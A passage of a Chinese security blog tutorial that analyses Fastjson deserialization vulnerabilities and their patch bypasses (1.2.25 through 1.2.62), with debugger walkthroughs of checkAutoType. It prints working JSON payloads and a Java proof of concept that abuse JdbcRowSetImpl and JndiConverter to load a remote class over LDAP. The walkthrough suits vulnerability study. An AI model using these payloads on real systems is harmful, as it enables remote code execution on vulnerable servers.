class="line">org.apache.bcel  </span><br><span class="line">org.apache.commons.beanutils  </span><br><span class="line">org.apache.commons.collections.Transformer  </span><br><span class="line">org.apache.commons.collections.functors  </span><br><span class="line">org.apache.commons.collections4.comparators  </span><br><span class="line">org.apache.commons.fileupload  </span><br><span class="line">org.apache.myfaces.context.servlet  </span><br><span class="line">org.apache.tomcat  </span><br><span class="line">org.apache.wicket.util  </span><br><span class="line">org.codehaus.groovy.runtime  </span><br><span class="line">org.hibernate  </span><br><span class="line">org.jboss  </span><br><span class="line">org.mozilla.javascript  </span><br><span class="line">org.python.core  </span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>这里把 CC的链子全部过滤了。</p><p>调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/32.png"></p><h2 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h2><p>autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。</p><p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p><ul><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li></ul><p>AutoType白名单设置方法：</p><ol><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li><li>通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><p>贴一张 参照了 白日梦组长的图，自己简单修改了一下的图，需要自取：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/rmm.jpg"></p><h2 id="绕过利用"><a href="#绕过利用" class="headerlink" title="绕过利用"></a>绕过利用</h2><p>直接先给出 payload:</p><p><code>&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</code></p><p>关键位置：<br>Lcom.sun.rowset.JdbcRowSetImpl;</p><p>直接运行的话  会报 类型不允许 ，即黑名单过滤了：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/33.jpg"></p><p>注意是要开启AutoTypeSupport的，添加以下代码就ok了：</p><p><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code><br>直接运行即可绕过checkAutoType()黑名单实现弹计算器：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/34.png"></p><h2 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h2><p>注意到 相比原POC  添加了 L 和 ; 就绕过了 </p><p>我们先在 DefaultJSONParser 的更改处，也就是 25 新增的 checkAutoType打个断点</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/35.png"><br>跟进去</p><p>因为我们 ”Lcom.sun.rowset.JdbcRowSetImpl;” 类名是由 “ L “ 开头，肯定是不在黑名单内的，从而绕过了 黑名单校验，再往下开始调用 TypeUtils.loadClass()：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/36.png"></p><p><code>TypeUtils.loadClass（）</code> 这里会有个判断，如果以 L 开头  ; 结尾 就提取出其中的类名再加载进来，因此能成功绕过</p><p>此时去头去尾 加载此类：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/37.jpg"></p><p>紧接着 返回到 DefaultJsONParser 中，赋值给了clazz  往下就进入if 调用 deserialze()了,  往后的就是我们之前分析过的步骤，解析属性值啥的，并调用到 getter &#x2F; setter  接着就是  lookup() 了<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/38.png"></p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/39.jpg"></p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/40.jpg"></p><h1 id="Fastjson-12-2-42补丁绕过"><a href="#Fastjson-12-2-42补丁绕过" class="headerlink" title="Fastjson 12.2.42补丁绕过"></a>Fastjson 12.2.42补丁绕过</h1><p>先给出payload ：</p><p><code>&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/Exec\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</code></p><p>关键部分为 ：</p><p><code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></p><h2 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h2><p>在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/41.jpg"></p><p>但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。</p><p>后面的代码，是对提取出来的className即<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>进行denyList黑名单过滤，也就顺利绕过了。</p><p>注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/42.jpg"></p><p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/43.png"></p><h1 id="Fastjson-12-2-43补丁绕过"><a href="#Fastjson-12-2-43补丁绕过" class="headerlink" title="Fastjson 12.2.43补丁绕过"></a>Fastjson 12.2.43补丁绕过</h1><p>payload ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>关键POC ：<br><code>[com.sun.rowset.JdbcRowSetImpl</code></p><p>如果一开始的payload 是这样的话，就会报错  </p><p>&#96;{“@type”:”[com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit”, “autoCommit”</p><p>报错信息如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: exepct <span class="string">&#x27;[&#x27;</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置<br>因此改下payload，在第一个逗号前面加个”[“：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>运行又发现 期望在43 的位置有  {  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure><p>我们继续加上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/Exec\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>最终弹出计算器</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/44.png"></p><h2 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h2><p>调试发现，在checkAutoType () 函数肿，修改的是直接对类名 以  “LL” 开头的直接报错</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/45.png"></p><p>但是以”[“开头的类名自然能成功绕过上述校验以及黑名单过滤。</p><p>继续往下调试，在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/46.png"></p><p>解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了：</p><p>在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/47.jpg"></p><h1 id="Fastjson-1-2-2-45补丁绕过"><a href="#Fastjson-1-2-2-45补丁绕过" class="headerlink" title="Fastjson 1.2.2.45补丁绕过"></a>Fastjson 1.2.2.45补丁绕过</h1><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p><p>大概就是  mybatis 的包没有在黑名单内，以至于直接加载类，所以此处就不分析了</p><h1 id="Fastjson-x3D-1-2-62-反序列化漏洞"><a href="#Fastjson-x3D-1-2-62-反序列化漏洞" class="headerlink" title="Fastjson &#x3D;1.2.62 反序列化漏洞"></a>Fastjson &#x3D;1.2.62 反序列化漏洞</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞，可由其构造函数处触发利用。</p><h2 id="前提限制"><a href="#前提限制" class="headerlink" title="前提限制"></a>前提限制</h2><ul><li>需要开启AutoType</li><li>Fastjson &lt;&#x3D; 1.2.62</li><li>JNDI可接收的版本限制</li><li>目标服务端需要存在xbean-reflect包；</li></ul><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">  &lt;version&gt;<span class="number">1.2</span><span class="number">.47</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">  &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line">  &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line">  &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">POC</span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/Exec\&quot;&#125;&quot;</span>;  </span><br><span class="line">            JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启LDAP服务器和存放EXEC恶意类的服务器后运行即可弹出计算器</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/48.jpg"></p><p>前面都是跟之前的相同操作，我们直接把断点打到  CheckAutoType处<br>相比于之前的版本调试时发现，这里新增了一些逻辑，</p><p>源代码对比：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/49.jpg"></p><p>下面代码是判断是否调用 AutoType相关逻辑之前的代码，说明注释：：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 限制了JSON中@type指定的类名长度  </span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;  </span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 单独对expectClass参数进行判断，设置expectClassFlag的值  </span></span><br><span class="line"><span class="comment">// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true  </span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;  </span><br><span class="line">      <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;  </span><br><span class="line">          expectClassFlag = <span class="literal">false</span>;  </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> (expectClass == Object.class  </span><br><span class="line">                  || expectClass == Serializable.class  </span><br><span class="line">                  || expectClass == Cloneable.class  </span><br><span class="line">                  || expectClass == Closeable.class  </span><br><span class="line">                  || expectClass == EventListener.class  </span><br><span class="line">                  || expectClass == Iterable.class  </span><br><span class="line">                  || expectClass == Collection.class  </span><br><span class="line">                  ) &#123;  </span><br><span class="line">              expectClassFlag = <span class="literal">false</span>;  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">              expectClassFlag = <span class="literal">true</span>;  </span><br><span class="line">          &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line">      <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);  </span><br><span class="line">      Class&lt;?&gt; clazz = <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;  </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 1.2.43检测，&quot;[&quot;  </span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;  </span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [  </span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 1.2.41检测，&quot;Lxx;&quot;  </span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;  </span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 1.2.42检测，&quot;LL&quot;  </span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))  </span><br><span class="line">              * PRIME)  </span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))  </span><br><span class="line">              * PRIME)  </span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))  </span><br><span class="line">              * PRIME;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true  </span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,  </span><br><span class="line">              TypeUtils.fnv1a_64(className)  </span><br><span class="line">      ) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>看到这  相比之前就是对这里的内部白名单做了防护，往下看 也是要绕过这个内部白名单才能够加载类。</p><p>这里的利用肯定是要 分两种情况的，一个是开启了AutoType  一个是未开启</p><h2 id="未开启AutoType时"><a href="#未开启AutoType时" class="headerlink" title="未开启AutoType时"></a>未开启AutoType时</h2><p>在前面的基础上进行调试</p><p>由于未开启 AutoType ，未设置 expectClass  且类名不在内部白名单中，因此第一段 if 判断 没法进去 (这是开启了 AutoType才能进去的逻辑，后续会用到)</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/50.jpg"></p><p>往下，就是尝试加载 class的环节，但没有能加载成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果clazz还为null，则尝试从Mapping缓存中加载clazz  </span></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">          clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 如果clazz还为null，则尝试调用findClass()来加载clazz  </span></span><br><span class="line">      <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">          clazz = deserializers.findClass(typeName);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 如果clazz还为null，则尝试从typeMapping中获取clazz  </span></span><br><span class="line">      <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">          clazz = typeMapping.get(typeName);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 如果在前面判断是在internalWhite即内部哈希白名单中，则直接加载clazz  </span></span><br><span class="line">      <span class="keyword">if</span> (internalWhite) &#123;  </span><br><span class="line">          clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">true</span>);  </span><br><span class="line">      &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 如果clazz不为空，且expectClass不为空、clazz不为HashMap类型、clazz不为expectClass的子类，则直接返回该类  </span></span><br><span class="line">      <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">          <span class="keyword">if</span> (expectClass != <span class="literal">null</span>  </span><br><span class="line">                  &amp;&amp; clazz != java.util.HashMap.class  </span><br><span class="line">                  &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">          &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">return</span> clazz;  </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>接着往下就到了  <strong>未开启 AutoTyoe 的逻辑判断：</strong></p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/51.png"></p><p>此处先进行哈希黑名单过滤，然后进行哈希白名单匹配。由于该Gadget并不在黑名单中，因此能绕过此检测逻辑，但是我们也不在这个白名单内，所以继续往下走</p><p>往下的代码逻辑如下，看注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// 这里通过ASM对指定class进行visit，并尝试获取JsonType注解信息  </span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">jsonType</span> <span class="operator">=</span> <span class="literal">false</span>;  </span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">      <span class="keyword">try</span> &#123;  </span><br><span class="line">          <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;  </span><br><span class="line">          <span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;  </span><br><span class="line">              is = defaultClassLoader.getResourceAsStream(resource);  </span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">              is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;  </span><br><span class="line">              <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);  </span><br><span class="line">              <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span 